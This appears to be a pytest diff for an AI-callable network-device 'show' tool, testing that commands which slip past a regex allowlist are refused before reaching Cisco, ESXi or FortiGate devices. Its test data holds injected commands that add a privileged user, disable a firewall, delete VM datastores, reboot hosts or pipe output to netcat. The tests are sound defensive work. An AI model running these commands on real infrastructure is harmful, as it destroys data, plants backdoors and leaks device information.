@@ -5,6 +5,7 @@ it *before* it opens a session to the device.
 
 from __future__ import annotations
 
+import json
 from typing import Any
 
 import pytest
@@ -107,8 +108,97 @@ def test_cisco_commands_that_could_leak_a_config_are_refused(wired, command):
     result = obs.show(device="sw-core-01", command=command)
 
     assert result["allowed"] is False
-    assert "allowlist" in result["error"]
+    assert result["error"]
     assert wired.devices.calls == [], "a refused command never opens a session"
+
+
+# Every one of these is allowed by the platform allowlist as written: the
+# regexes match a whitespace-collapsed copy of the command, so an embedded
+# newline is swallowed by a trailing `.*`, and the esxcli patterns are prefix
+# matches with no verb restriction. `device.show` is the component that turns a
+# model string into device execution, so it refuses them itself.
+BYPASSES = [
+    ("sw-core-01", "show ip route\nconfigure terminal\nvlan 999\nend\nshow ip route summary"),
+    (
+        "sw-core-01",
+        "show mac address-table\nconfigure terminal\n"
+        "username evil privilege 15 secret x\nend\nshow mac address-table count",
+    ),
+    ("esx-01", "esxcli network firewall set --enabled false"),
+    ("esx-01", "esxcli network vswitch standard uplink remove -u vmnic0 -v vSwitch0"),
+    ("esx-01", "esxcli storage core device set --state=off -d naa.1"),
+    ("esx-01", "esxcli network ip interface list; rm -rf /vmfs/volumes/ds1/vm1"),
+    ("esx-01", "esxcli system version get; echo pwned > /etc/rc.local.d/local.sh"),
+    ("esx-01", "esxcli network ip interface list $(reboot)"),
+    ("esx-01", "esxcli network ip interface list `reboot`"),
+    ("esx-01", "esxcli system version get && halt"),
+    ("esx-01", "esxcli system version get | nc 10.0.0.9 1234"),
+]
+
+
+@pytest.mark.parametrize(("device", "command"), BYPASSES)
+def test_a_command_the_allowlist_regexes_let_through_is_still_refused(wired, device, command):
+    assert wired.gateway.is_command_allowed(INVENTORY.get(device).platform, command), (
+        "this case is only interesting while the raw allowlist still admits it"
+    )
+
+    result = obs.show(device=device, command=command)
+
+    assert result["allowed"] is False
+    assert wired.devices.calls == [], "nothing reaches the device"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "show version\r\nreload",
+        "show version; configure terminal",
+        "show version && reload",
+        "show version $(reload)",
+        "show version\treload",
+    ],
+)
+def test_a_command_carrying_a_second_command_never_runs(wired, command):
+    result = obs.show(device="sw-core-01", command=command)
+
+    assert result["allowed"] is False
+    assert wired.devices.calls == []
+
+
+def test_a_refused_command_is_reported_in_its_normalised_form(wired):
+    result = obs.show(device="sw-core-01", command="show version\nconfigure terminal")
+
+    assert result["allowed"] is False
+    assert "\n" not in json.dumps(result["command"])
+    assert result["command"] == "show version configure terminal"
+    assert wired.devices.calls == [], "nothing was run, whatever the string said"
+
+
+def test_only_the_normalised_command_reaches_the_device(wired):
+    result = obs.show(device="sw-core-01", command="  show    interfaces   status  ")
+
+    assert result["allowed"] is True
+    assert result["command"] == "show interfaces status"
+    assert wired.devices.calls == [("sw-core-01", "show interfaces status")]
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "esxcli network ip interface list",
+        "esxcli system version get",
+        "esxcli storage core device list",
+        "esxcli software vib list",
+        "esxcli hardware platform get",
+        "vim-cmd vmsvc/getallvms",
+        "vim-cmd hostsvc/hostsummary",
+    ],
+)
+def test_read_only_esxi_commands_still_run(wired, command):
+    result = obs.show(device="esx-01", command=command)
+
+    assert result["allowed"] is True, result.get("error")
+    assert wired.devices.calls == [("esx-01", command)]
 
 
 @pytest.mark.parametrize(
@@ -203,10 +293,24 @@ def test_a_transport_failure_is_reported_not_raised(wired):
     assert result["allowed"] is True
 
 
-def test_the_fortios_monitor_map_only_covers_read_only_endpoints():
-    for command, endpoint in obs.FORTIOS_MONITOR_MAP.items():
-        assert endpoint.startswith("monitor/"), command
-        assert "backup" not in endpoint and "cmdb" not in endpoint, command
+def test_the_fortios_endpoint_map_only_covers_read_only_endpoints():
+    for command, endpoint in obs.FORTIOS_ENDPOINT_MAP.items():
+        # `monitor/` is live state; `cmdb/` GET is the read half of the config
+        # API. Both are read-only; nothing else may appear here.
+        assert endpoint.startswith(("monitor/", "cmdb/")), command
+        assert "backup" not in endpoint and "restore" not in endpoint, command
+
+
+def test_configured_objects_come_from_cmdb_not_from_the_counters():
+    """`monitor/firewall/policy` returns hit counters, not the rules the owner wrote."""
+    assert obs.FORTIOS_ENDPOINT_MAP["get firewall policy"] == "cmdb/firewall/policy"
+    assert obs.FORTIOS_ENDPOINT_MAP["get firewall address"] == "cmdb/firewall/address"
+    assert obs.FORTIOS_ENDPOINT_MAP["get firewall vip"] == "cmdb/firewall/vip"
+    assert obs.FORTIOS_ENDPOINT_MAP["get system status"] == "monitor/system/status"
+
+
+def test_the_standalone_60f_is_told_what_an_empty_ha_peer_list_means():
+    assert "standalone" in obs.FORTIOS_ENDPOINT_NOTES["get system ha status"]
 
 
 # -- metrics and logs ---------------------------------------------------------
@@ -327,3 +431,160 @@ def test_the_tools_are_registered_and_callable_by_the_model():
         assert REGISTRY[name].llm_callable is True
         assert REGISTRY[name].description
     assert REGISTRY["device.show"].parallel_safe is False
+
+
+# -- the transports themselves ------------------------------------------------
+
+
+def test_the_fortigate_transport_reuses_one_session_and_labels_the_endpoint(monkeypatch):
+    """The 60F gets one poller at >=60s; a tool the model can loop on gets a floor."""
+    from types import SimpleNamespace
+
+    import requests
+
+    created: list[Any] = []
+
+    class FakeSession:
+        def __init__(self) -> None:
+            self.headers: dict[str, str] = {}
+            self.verify = True
+            self.gets: list[str] = []
+            created.append(self)
+
+        def get(self, url: str, timeout: float | None = None) -> Any:
+            self.gets.append(url)
+            return SimpleNamespace(
+                raise_for_status=lambda: None,
+                json=lambda: {"results": [{"policyid": 1, "name": "wan-out"}]},
+            )
+
+    slept: list[float] = []
+    monkeypatch.setattr(requests, "Session", FakeSession)
+    monkeypatch.setattr(obs.time, "sleep", lambda seconds: slept.append(seconds))
+    transport = obs.FortiGateShowTransport()
+    device = INVENTORY.get("fw-01")
+    cred = Credential(token="a-read-only-api-token")
+
+    policies = transport.run(device, cred, "get firewall policy")
+    transport.run(device, cred, "get system status")
+
+    assert len(created) == 1, "one TLS session per device, not one per tool call"
+    assert created[0].verify is False, "pinning is a Phase 1 decision, not a second policy"
+    assert policies["endpoint"] == "api/v2/cmdb/firewall/policy"
+    assert policies["results"] == [{"policyid": 1, "name": "wan-out"}]
+    assert created[0].gets[1].endswith("/api/v2/monitor/system/status")
+    assert slept and slept[0] > 0, "the second call to one device waits"
+
+
+def test_the_fortigate_transport_says_what_an_empty_ha_peer_list_means(monkeypatch):
+    from types import SimpleNamespace
+
+    import requests
+
+    class FakeSession:
+        def __init__(self) -> None:
+            self.headers: dict[str, str] = {}
+            self.verify = True
+
+        def get(self, url: str, timeout: float | None = None) -> Any:
+            return SimpleNamespace(raise_for_status=lambda: None, json=lambda: {"results": []})
+
+    monkeypatch.setattr(requests, "Session", FakeSession)
+    monkeypatch.setattr(obs, "FORTIGATE_MIN_INTERVAL_SECONDS", 0.0)
+
+    answer = obs.FortiGateShowTransport().run(
+        INVENTORY.get("fw-01"), Credential(token="t"), "get system ha status"
+    )
+
+    assert answer["results"] == []
+    assert "standalone" in answer["note"]
+
+
+def test_an_unmapped_fortios_command_never_guesses_an_endpoint():
+    with pytest.raises(LookupError):
+        obs.FortiGateShowTransport().run(
+            INVENTORY.get("fw-01"), Credential(token="t"), "get system fortiguard"
+        )
+
+
+def test_ssh_host_keys_are_pinned_when_the_operator_has_recorded_them(monkeypatch):
+    monkeypatch.delenv("INFRA_SSH_KNOWN_HOSTS", raising=False)
+    assert obs.ssh_known_hosts() is None
+
+    monkeypatch.setenv("INFRA_SSH_KNOWN_HOSTS", "/etc/infra/known_hosts")
+    assert obs.ssh_known_hosts() == "/etc/infra/known_hosts"
+
+
+def fake_paramiko(monkeypatch) -> list[Any]:
+    import io
+
+    paramiko = pytest.importorskip("paramiko")
+    made: list[Any] = []
+
+    class FakeSSHClient:
+        def __init__(self) -> None:
+            self.policy: Any = None
+            self.loaded: str | None = None
+            self.command: str | None = None
+            made.append(self)
+
+        def set_missing_host_key_policy(self, policy: Any) -> None:
+            self.policy = policy
+
+        def load_host_keys(self, path: str) -> None:
+            self.loaded = path
+
+        def connect(self, **kwargs: Any) -> None:
+            self.kwargs = kwargs
+
+        def exec_command(self, command: str, timeout: float | None = None) -> Any:
+            self.command = command
+            return None, io.BytesIO(b"vmnic0 Up 1000\n"), io.BytesIO(b"")
+
+        def close(self) -> None:
+            pass
+
+    monkeypatch.setattr(paramiko, "SSHClient", FakeSSHClient)
+    return made
+
+
+def test_the_esxi_transport_rejects_an_unknown_host_key_once_keys_are_recorded(
+    monkeypatch, tmp_path
+):
+    import paramiko
+
+    known = tmp_path / "known_hosts"
+    known.write_text("")
+    monkeypatch.setenv("INFRA_SSH_KNOWN_HOSTS", str(known))
+    made = fake_paramiko(monkeypatch)
+
+    obs.EsxiShowTransport().run(
+        INVENTORY.get("esx-01"),
+        Credential(username="root", password="x"),
+        "esxcli network nic list",
+    )
+
+    assert isinstance(made[0].policy, paramiko.RejectPolicy)
+    assert made[0].loaded == str(known)
+
+
+def test_the_esxi_transport_runs_one_normalised_command(monkeypatch):
+    monkeypatch.delenv("INFRA_SSH_KNOWN_HOSTS", raising=False)
+    made = fake_paramiko(monkeypatch)
+
+    output = obs.EsxiShowTransport().run(
+        INVENTORY.get("esx-01"),
+        Credential(username="root", password="x"),
+        "  esxcli   network   nic   list  ",
+    )
+
+    assert made[0].command == "esxcli network nic list"
+    assert "vmnic0" in output
+
+
+def test_an_empty_command_is_refused_before_anything_else(wired):
+    result = obs.show(device="sw-core-01", command="   ")
+
+    assert result["allowed"] is False
+    assert "no command" in result["error"]
+    assert wired.devices.calls == []
